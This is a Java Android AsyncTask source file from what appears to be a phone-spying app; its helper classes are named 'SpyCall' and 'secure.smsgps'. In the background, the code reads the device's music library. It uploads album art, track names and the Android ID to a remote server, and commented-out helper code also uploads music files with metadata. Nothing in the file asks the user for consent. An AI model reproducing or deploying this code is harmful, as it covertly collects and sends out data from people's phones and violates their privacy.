/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.sql.Timestamp;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.TimeZone;

import org.json.JSONObject;

import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.MediaStore;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.ConnectUrl;
import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.JsonPostRequest;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

public class MusicAlbumIconUploadAsyncTask extends AsyncTask<String, Void, String> {
	
	private Context ctx;
	private static final String TAG = "MusicAlbumIconUploadAsyncTask";
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;	
	/**
	 * 
	 */
	public MusicAlbumIconUploadAsyncTask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected String doInBackground(String... params) {		
		try{
		//	getMusicDetail();
			initLayout();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedMusicAlbumImageUpload();
		}
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}
	
/*********************** Start Video *****************************/
	 private void initLayout() {
         final Uri uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
         final String[] cursor_cols = { MediaStore.Audio.Media._ID,
                 MediaStore.Audio.Media.ARTIST, MediaStore.Audio.Media.ALBUM,
                 MediaStore.Audio.Media.TITLE, MediaStore.Audio.Media.DATA,
                 MediaStore.Audio.Media.ALBUM_ID,
                 MediaStore.Audio.Media.DURATION };
         final String where = MediaStore.Audio.Media.IS_MUSIC + "=1";
         final Cursor cursor = ctx.getContentResolver().query(uri, cursor_cols, where, null, null);

         while (cursor.moveToNext()) {
             String artist = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.ARTIST)); //<unknown>
             String album = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.ALBUM));  //topchatdownload
             String track = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.TITLE));   // media1417601419112_1417601420
             String data = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA));	// /storage/emulated/0/topchatdownload/media1417601419112_1417601420.wav
             Long albumId = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.ALBUM_ID));  // 5

             int duration = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DURATION)); // 2620

             Uri sArtworkUri = Uri .parse("content://media/external/audio/albumart");
             Uri albumArtUri = ContentUris.withAppendedId(sArtworkUri, albumId);  // content://media/external/audio/albumart/5
             
             String extension = getExtension(new File(data)); 
             System.out.println(extension);
             
             Bitmap bitmap = null;
             try {
                 bitmap = MediaStore.Images.Media.getBitmap(ctx.getContentResolver(), albumArtUri);
                 bitmap = Bitmap.createScaledBitmap(bitmap, 30, 30, true);
             } catch (FileNotFoundException exception) {
                 exception.printStackTrace();
                 //bitmap = BitmapFactory.decodeResource(ctx.getResources(), R.drawable.audio_file);
             } catch (IOException e) {
                 e.printStackTrace();
             }
             
         	byte[] byteArray = null;
			if(bitmap != null)
			{
				try {
					ByteArrayOutputStream stream = new ByteArrayOutputStream();
					bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
					byteArray = stream.toByteArray();
					
					 //create a file to write bitmap data
		             File file = new File(ctx.getCacheDir(), "smash");
		             file.createNewFile();

		             //Convert bitmap to byte array
		             ByteArrayOutputStream bos = new ByteArrayOutputStream();
		             bitmap.compress(CompressFormat.PNG, 0 /*ignored for PNG*/, bos);
		             byte[] bitmapdata = bos.toByteArray();

		             //write the bytes in file
		             FileOutputStream fos = new FileOutputStream(file);
		             fos.write(bitmapdata);
		             
					ArrayList<String[]> arraylist1 = new ArrayList<String[]>();
				
					String a[] = { "upload_device_id",  Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID)};
					arraylist1.add(a);
					String b[] = { "file", track + "."+extension  };
					arraylist1.add(b);
					
					
					ArrayList<String> arraylist2 = new ArrayList<String>();
					arraylist2.add(file.getPath());
					
					System.out.println(byteArray); 
					JsonPostRequest postrequest = new JsonPostRequest();
					String imageResponse = postrequest.doPostWithFile2(ConnectUrl.URL_Music_Album_Image_upload, arraylist1,arraylist2, track, "png");
					System.out.println(imageResponse); 
					//String getResponceMusic = uploadDeviceMusic(data,track,data, "","","",byteArray);
				} catch (Exception e) {
					e.printStackTrace();
				}
				
			}
			else
			{
				System.out.println("bitmap is null");
			}
         }
     }
	 
	  /*
	     * Get the extension of a file.
	     */
	    public static String getExtension(File f) {
	        String ext = null;
	        String s = f.getName();
	        int i = s.lastIndexOf('.');

	        if (i > 0 && i < s.length() - 1) {
	            ext = s.substring(i + 1).toLowerCase();
	        }
	        return ext;
	    }
	    
	/*public void getMusicDetail() {
		
		String filepath,imagename,imagetype;

		try {
			final String orderBy = MediaStore.Audio.AudioColumns._ID;
			Cursor musiccursor1 = ctx.getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, null, null, null, orderBy);
			int getTotal = musiccursor1.getCount();

			int PreImageCount = SpyCallSharedPrefrence.getsaveMUSIC_PreCount(ctx);
			int remaingCount = getTotal - PreImageCount;
			Log.i("remaining count", ""+remaingCount);

			int pp;
			if (remaingCount > 0) {
				Log.i("remaining count", remaingCount + "");
				if (remaingCount > 2) {
					pp = 2;
				} else {
					pp = remaingCount;
				}
				Cursor musicCursor = ctx.getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, null,
						null, null,
						orderBy + " LIMIT " + getTotal + "," + pp);
				// CallActivity.Imagescount=CallActivity.Imagescount+pp;
				int image_column_index = musicCursor.getColumnIndex(MediaStore.Audio.AudioColumns._ID);
				Log.i("getTotalt***************", "" + getTotal);
				int j = 0;
				int countImage = 0;
				while (musicCursor.moveToNext()) {
					countImage++;
					musicCursor.getInt(image_column_index);
					int dataColumnIndex = musicCursor.getColumnIndex(MediaStore.Audio.AudioColumns.DATA);
					int dateIndex = musicCursor.getColumnIndex(MediaStore.Audio.AudioColumns.DATE_ADDED);
					//for finding the size
					int mvideoSizeIndex = musicCursor.getColumnIndex(MediaStore.Audio.AudioColumns.SIZE);
					
					String bucket;
					int bucketColumn = musicCursor.getColumnIndex(MediaStore.Audio.Media.DISPLAY_NAME);
					Long albumId = musicCursor.getLong(musicCursor.getColumnIndexOrThrow(MediaStore.Audio.Media.ALBUM_ID));
					
					Uri sArtworkUri = Uri.parse("content://media/external/audio/albumart");
					Uri albumArtUri = ContentUris.withAppendedId(sArtworkUri, albumId);

					Bitmap bitmap = null;
					try {
						bitmap = MediaStore.Images.Media.getBitmap(ctx.getContentResolver(), albumArtUri);
						bitmap = Bitmap.createScaledBitmap(bitmap, 30, 30, true);
					} catch (FileNotFoundException exception) {
                   exception.printStackTrace();
                   // bitmap = BitmapFactory.decodeResource(ctx.getResources(), R.drawable.audio_file);
					} catch (IOException e) {
						e.printStackTrace();
					}
					byte[] byteArray = null;
					if(bitmap != null)
					{
						ByteArrayOutputStream stream = new ByteArrayOutputStream();
						bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
						byteArray = stream.toByteArray();
						
						System.out.println(byteArray); 
					}
					else
					{
						System.out.println("bitmap is null");
					}
				
               
					// Get the field values
					bucket = musicCursor.getString(bucketColumn);

					 // Do something with the values.
					Log.i("ListingImages", " bucket=" + bucket);

					double duration;
					int durationColumn = musicCursor.getColumnIndex(MediaStore.Audio.Media.DURATION);
					
					// Get the field values
					duration = musicCursor.getDouble(durationColumn)/1000;
					
					System.out.println(duration); 
					
					String mvideoSize=musicCursor.getString(mvideoSizeIndex);
				    double mvideoSizeMB=(Integer.parseInt(mvideoSize))/(1024*1024);
				    
					String ImageDate = musicCursor.getString(dateIndex);
					if (ImageDate.equals("null")) {
						Long.valueOf("1523415");
					}
					long xyz = Long.valueOf(ImageDate);
					Timestamp st = new Timestamp(xyz);
					java.util.Date date1 = new java.util.Date(st.getTime());
					DateFormat df = DateFormat.getDateInstance();
					TimeZone zone1 = TimeZone.getTimeZone(df.getTimeZone()
							.getID()); // For example...
					DateFormat format1 = new SimpleDateFormat(
							"yyyy-MM-dd HH-mm-ss"); // Put your pattern here
					format1.setTimeZone(zone1);
					String SMStime = format1.format(date1);

					
					 * Calendar c = Calendar.getInstance(); SimpleDateFormat df
					 * = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); String
					 * SMStime = df.format(c.getTime());
					 

					filepath = musicCursor.getString(dataColumnIndex);
					Log.i("filepath************************", filepath);

					j = filepath.lastIndexOf("/");
					imagename = filepath.substring(j + 1,filepath.lastIndexOf("."));
					imagetype = filepath.substring(filepath.lastIndexOf(".") + 1);
					try {
						if (Utility.isNetworkAvailable(ctx)) {
							//bm.recycle();
							System.gc();
							//video should be uploaded greater less than equals to 10 mb
							if(mvideoSizeMB<=10){
								int musicPreCount=PreImageCount + pp;
							new YourAsyncTask_MusicDetail(filepath, imagename, imagetype, SMStime,"" + countImage, musicPreCount+ "",pp+"",bucket,duration+"",byteArray).execute();
							}else{
								SpyCallSharedPrefrence.saveMUSIC_PreCount(ctx, PreImageCount+countImage);
							}
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				// CallActivity.Imagescount=CallActivity.Imagescount+pp;
				//CellPoliceSharedPreferences.saveVIDEO_PreCount(ctx, PreImageCount + pp);
			} else {
			}
		} catch (Exception e) {
			 //new YourAsyncTask_Facebook().execute();
			e.printStackTrace();
		}
	}*/

	class YourAsyncTask_MusicDetail extends AsyncTask<String, Void, Void> {

		int getcountImage = 0;
		int getRemainingCount;
		
		String filepath="",imagename="",imagetype="", sMStime="",string="",string2="",string3="",bucket="", string4="";
		byte[] byteArray=null;

		public YourAsyncTask_MusicDetail(String filepath, String imagename,
				String imagetype, String sMStime, String string,
				String string2, String string3, String bucket, String string4,
				byte[] byteArray) { 

			this.filepath=filepath;
			this.imagename=imagename;
			this.imagetype=imagetype;
			this.sMStime=sMStime;
			this.string=string;
			this.string2=string2;
			this.string3=string3;
			this.bucket=bucket;
			this.string4=string4;
			this.byteArray=byteArray;
			
		}

		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params) {
			// make your request here - it will run in a different thread
			try {
				getcountImage = Integer.parseInt(params[4]);
				getRemainingCount= Integer.parseInt(params[6]);
				String getResponceMusic = uploadDeviceMusic(filepath, imagename,imagetype, sMStime,bucket,string4, byteArray);
				Log.e(TAG,getResponceMusic);
				JSONObject responseObject = new JSONObject(getResponceMusic);
				if (responseObject.getJSONObject("response").getString("audio").equals("Audio Success")) {
					SpyCallSharedPrefrence.saveMUSIC_PreCount(ctx, Integer.parseInt(params[5]));
					Log.i(TAG, "Success");
				}
			} catch (Exception e) {
				 //new YourAsyncTask_Facebook().execute();
				e.printStackTrace();
			}

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {

			// Log.i("imageuploade resposne******************",
			// getResponceImages);
			Log.i(TAG, ""+getcountImage);
			Log.i(TAG, ""+getRemainingCount);
			if(getcountImage==getRemainingCount)  {
				try {
					 
				} catch (Exception e) {
					// TODO: handle exception
					e.printStackTrace();
				}
			}
		}
	}

	public String uploadDeviceMusic(String imagename, String imagename2,
			String imagetype,String imageDate,String albumname, String duration, byte[] byteArray) { 
		String getUserID_SP=  HinjAppPreferenceUtils.getRaId(ctx);
		String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
		//String deviceID = HinjAppPreferenceUtils.getDeviceId(ctx);
		String upload_device_id = HinjAppPreferenceUtils.getUploadDeviceID(ctx);
		
		//Log.e("getDeviceIDString for Upload Images  ",getDeviceIDString);
		Log.i("resonse", "anotherone");
		File file = new File(imagename);
		ArrayList<String> arraylist2 = new ArrayList<String>();
		arraylist2.add(file.getPath());
		ArrayList<String[]> arraylist1 = new ArrayList<String[]>();
		/*String a[] = { "user_id", getUserID_SP};
		arraylist1.add(a);*/
		String b[] = { "date_time",imageDate};
		arraylist1.add(b);
		String c[] = { "device_os", "Android" };
		arraylist1.add(c);
		String e[] = { "type", "3" };
		arraylist1.add(e);
		String f[] = { "upload_device_id", android_id };
		arraylist1.add(f);
		String g[] = { "album", albumname };
		arraylist1.add(g);
		String h[] = { "duration", duration };
		arraylist1.add(h);
		JsonPostRequest postrequest = new JsonPostRequest();
		String imageResponse = postrequest.doPostWithFile2(ConnectUrl.URL_Music_Album_Image_upload, arraylist1,arraylist2, imagename2, imagetype);
		arraylist2.clear();
		arraylist1.clear();
		return imageResponse;
	}
	
	/*********************** End Video *******************************/
}
